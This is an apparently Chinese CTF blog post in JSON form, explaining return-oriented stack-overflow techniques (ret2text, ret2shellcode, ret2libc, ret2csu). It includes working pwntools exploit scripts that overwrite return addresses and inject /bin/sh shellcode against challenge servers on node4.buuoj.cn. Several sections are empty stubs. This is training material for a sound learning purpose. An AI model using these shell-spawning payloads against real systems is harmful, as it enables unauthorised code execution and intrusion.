{"title":"ret2xx","uid":"e75c21f70c678b134f6a0bde8c339180","slug":"CTF/pwn/ret2xx","date":"2022-01-18T11:55:26.000Z","updated":"2022-01-20T04:45:01.559Z","comments":true,"path":"api/articles/CTF/pwn/ret2xx.json","keywords":null,"cover":"/img/21.jpg","content":"<span id=\"more\"></span>\n\n<h1 id=\"ret2xx\"><a href=\"#ret2xx\" class=\"headerlink\" title=\"ret2xx\"></a>ret2xx</h1><h2 id=\"什么是ret2xx\"><a href=\"#什么是ret2xx\" class=\"headerlink\" title=\"什么是ret2xx\"></a>什么是ret2xx</h2><p>泛指ret2text，ret2shellcode，ret2syscall，ret2libc，ret2csu，其中ret2是return to的谐音，可以使用利用eip指针的方法来获取权限</p>\n<h2 id=\"ROP\"><a href=\"#ROP\" class=\"headerlink\" title=\"ROP\"></a>ROP</h2><p>Return Oriented Programming</p>\n<p>ROP指通过修改Gadgets的ret结尾的指令顺序来实施攻击，需要如下条件：</p>\n<p>1.程序存在栈溢出，能控制返回地址</p>\n<p>2.可以找到满足条件的gadgets，而且知道gadgets的地址</p>\n<h2 id=\"ret2text\"><a href=\"#ret2text\" class=\"headerlink\" title=\"ret2text\"></a>ret2text</h2><p>对.text节的利用，会使用程序中已有的代码来进行攻击</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>进程存在危险函数如system(“/bin”)或execv(“/bin/sh”,0,0)的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。</p></blockquote>\n<h4 id=\"例题jarvisoj-level2\"><a href=\"#例题jarvisoj-level2\" class=\"headerlink\" title=\"例题jarvisoj_level2\"></a>例题jarvisoj_level2</h4><p>首先找system函数的地址和/bin/sh字符串的地址</p>\n<p><img src=\"/img/ret2xx_img/image-20220118193739346-16425613720661.png\" alt=\"image-20220118193739346\"></p>\n<p><img src=\"/img/ret2xx_img/image-20220118193754867-16425613720662.png\" alt=\"image-20220118193754867\"></p>\n<p>构造思路如下，先用0x88把缓冲区沾满，然后用0x4把ebp占满，然后修改返回地址为system(“/bin/sh”)即system的函数地址加上/bin/sh的地址，脚本编写时可以用pwntools的ELF模块</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"level2\"</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node4.buuoj.cn\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28053</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input:\\n\"</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x88</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x4</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x08048320</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x804A024</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># payload分为五部分</span>\n<span class=\"token comment\"># 第一块0x88个a填充栈到溢出</span>\n<span class=\"token comment\"># 第二块0x4个b填充ebp</span>\n<span class=\"token comment\"># 第三块为system函数地址</span>\n<span class=\"token comment\"># 第四块为system的返回地址(随便填任意值就行，不然会EOF)</span>\n<span class=\"token comment\"># 第五块为/bin/sh的地址指针</span>\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"例题jarvisoj-level2-x64\"><a href=\"#例题jarvisoj-level2-x64\" class=\"headerlink\" title=\"例题jarvisoj_level2_x64\"></a>例题jarvisoj_level2_x64</h4><p>成因和32位的一样，区别在于64位函数在调用传参时先试用寄存器(依次为rdi,rsi,rdx,rcx,r8,r9)，那么我们将rdi指向/bin/sh即可</p>\n<p>设置rdi的方法是使用pop rdi; ret代码片段，用ropgagdet可以找</p>\n<h2 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h2><p>控制程序来执行shellcode代码，一般而言shellcode需要我们自己填充</p>\n<h4 id=\"例题jarvisoj-level1\"><a href=\"#例题jarvisoj-level1\" class=\"headerlink\" title=\"例题jarvisoj_level1\"></a>例题jarvisoj_level1</h4><p>首先题目会泄漏buf的首地址，也就是我们每次都可以知道buf的地址，只要能将buf的返回地址改成我们需要的shellcode即可，然后将shellcode的返回地址改为buf的地址（至于为什么我也不知道，明天问一问）</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">)</span>\nfilepath <span class=\"token operator\">=</span> <span class=\"token string\">'./level1'</span>\n\n<span class=\"token comment\"># p = process(filepath)</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node4.buuoj.cn\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26859</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"What's this:\"</span><span class=\"token punctuation\">)</span>\nbuf <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> shellcode\npayload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 最后一处的buf是作为shellcode的返回地址的</span>\n<span class=\"token comment\"># 所以为什么要这样做呢。。</span>\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a>ret2syscall</h2><p>控制程序执行系统调用获取shell</p>\n<p>前提是系统存在0x80等中断类似触发系统调用的情况</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>用户进程在执行系统调用前，先把系统调用名（实际上是系统调用号）、输入参数等放到寄存器上(EBX,ECX等寄存器)<br>然后发出int 0x80指令，即触发xxx号中断<br>系统暂停用户进程，根据xxx号中断找到中断服务程序，这个程序名就叫system_call()<br>system_call()接着执行。它会从寄存器中找到系统调用名、输入参数等，并根据系统调用上下文中找到引发系统调用的进程；执行完毕后它又会把输出结果放到寄存器中。<br>系统恢复用户进程，进程从寄存器中取到自己想要的东西，然后继续执行。</p></blockquote>\n<h4 id=\"例题inndy-rop\"><a href=\"#例题inndy-rop\" class=\"headerlink\" title=\"例题inndy_rop\"></a>例题inndy_rop</h4><h2 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h2><p>控制函数执行libc中的函数，通常是返回某个函数的plt或者函数的具体位置，一般情况下，我们会选择执行system(“/bin/sh”)，故而此时我们需要知道system函数的地址</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>补一下plt的概念：GOT和PLT都是一种重定向方式，比如printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。只有进程运运行后，printf函数的地址才能确定。</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>libc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。这个库可以根据 头文件划分为 15  个部分，其中包括：字符类型 ()、错误码()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 ()</p></blockquote>\n<p>因此libc存放的都是使用过的函数或者字符串，查询libc可以使用ldd[文件名查询libc文件]</p>\n<h4 id=\"例题jarvisoj-level1-1\"><a href=\"#例题jarvisoj-level1-1\" class=\"headerlink\" title=\"例题jarvisoj_level1\"></a>例题jarvisoj_level1</h4><h2 id=\"ret2csu\"><a href=\"#ret2csu\" class=\"headerlink\" title=\"ret2csu\"></a>ret2csu</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候我们很难找到每一个寄存器对应的gadgets，这时候，我们可以利用x64下的 __libc_csu_init 中的 gadgets，这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在</p></blockquote>\n<p>也就是说，其实 ret2csu和利用libc的思路一样，都是包含的指令来达到目标</p>\n<h4 id=\"例题level5\"><a href=\"#例题level5\" class=\"headerlink\" title=\"例题level5\"></a>例题level5</h4><h2 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h2><p><a href=\"https://zhuanlan.zhihu.com/p/362737337\">https://zhuanlan.zhihu.com/p/362737337</a></p>\n","text":" ret2xx什么是ret2xx泛指ret2text，ret2shellcode，ret2syscall，ret2libc，ret2csu，其中ret2是return to的谐音，可以使用利用eip指针的方法来获取权限 ROPReturn Oriented Programming...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"CTF/PWN","slug":"CTF-PWN","count":7,"path":"api/categories/CTF-PWN.json"}],"tags":[{"name":"CTF PWN","slug":"CTF-PWN","count":6,"path":"api/tags/CTF-PWN.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2xx\"><span class=\"toc-text\">ret2xx</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFret2xx\"><span class=\"toc-text\">什么是ret2xx</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ROP\"><span class=\"toc-text\">ROP</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ret2text\"><span class=\"toc-text\">ret2text</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98jarvisoj-level2\"><span class=\"toc-text\">例题jarvisoj_level2</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98jarvisoj-level2-x64\"><span class=\"toc-text\">例题jarvisoj_level2_x64</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ret2shellcode\"><span class=\"toc-text\">ret2shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98jarvisoj-level1\"><span class=\"toc-text\">例题jarvisoj_level1</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ret2syscall\"><span class=\"toc-text\">ret2syscall</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98inndy-rop\"><span class=\"toc-text\">例题inndy_rop</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ret2libc\"><span class=\"toc-text\">ret2libc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98jarvisoj-level1-1\"><span class=\"toc-text\">例题jarvisoj_level1</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ret2csu\"><span class=\"toc-text\">ret2csu</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98level5\"><span class=\"toc-text\">例题level5</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8E%A8%E8%8D%90%E9%98%85%E8%AF%BB\"><span class=\"toc-text\">推荐阅读</span></a></li></ol></li></ol>","author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Someone who is learning how to take life seriously","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"栈溢出进阶","uid":"4773296421a8fb9509157a21ee5da267","slug":"CTF/pwn/栈溢出进阶","date":"2022-01-20T01:17:23.000Z","updated":"2022-01-21T01:51:58.291Z","comments":true,"path":"api/articles/CTF/pwn/栈溢出进阶.json","keywords":null,"cover":"/img/23.jpg","text":" 栈溢出进阶stack smash在glibc-2.23可行，后续版本不可行了 在报错时会泄漏出文件名，原码中的__fortify_fail里有个__libc_massgae将命令行输入参数作为调试结果输出了，因此可以用这个命令行的参数进行格式化字符串输出，将我们想要的libc地...","link":"","photos":[],"count_time":{"symbolsCount":337,"symbolsTime":"1 mins."},"categories":[{"name":"CTF/PWN","slug":"CTF-PWN","count":7,"path":"api/categories/CTF-PWN.json"}],"tags":[{"name":"CTF PWN","slug":"CTF-PWN","count":6,"path":"api/tags/CTF-PWN.json"}],"author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Someone who is learning how to take life seriously","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"canary_pie绕过","uid":"5cbed18fc0178c7e2f7d933895162e2e","slug":"CTF/pwn/canary_pie绕过","date":"2022-01-18T11:53:50.000Z","updated":"2022-01-19T07:55:48.512Z","comments":true,"path":"api/articles/CTF/pwn/canary_pie绕过.json","keywords":null,"cover":"/img/22.jpg","text":" Canary_pie绕过Canary机制介绍canary是一种用来防护栈溢出的保护机制，原理是先在函数的入口处，从fs/gs寄存器中取出一个4字节或者8字节的值存到栈上，当程序结束后再检查这个值是否和存进去的值一致 Canary bypass只要保持canary值不变，依旧可以...","link":"","photos":[],"count_time":{"symbolsCount":928,"symbolsTime":"1 mins."},"categories":[{"name":"CTF/PWN","slug":"CTF-PWN","count":7,"path":"api/categories/CTF-PWN.json"}],"tags":[{"name":"CTF PWN","slug":"CTF-PWN","count":6,"path":"api/tags/CTF-PWN.json"}],"author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Someone who is learning how to take life seriously","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}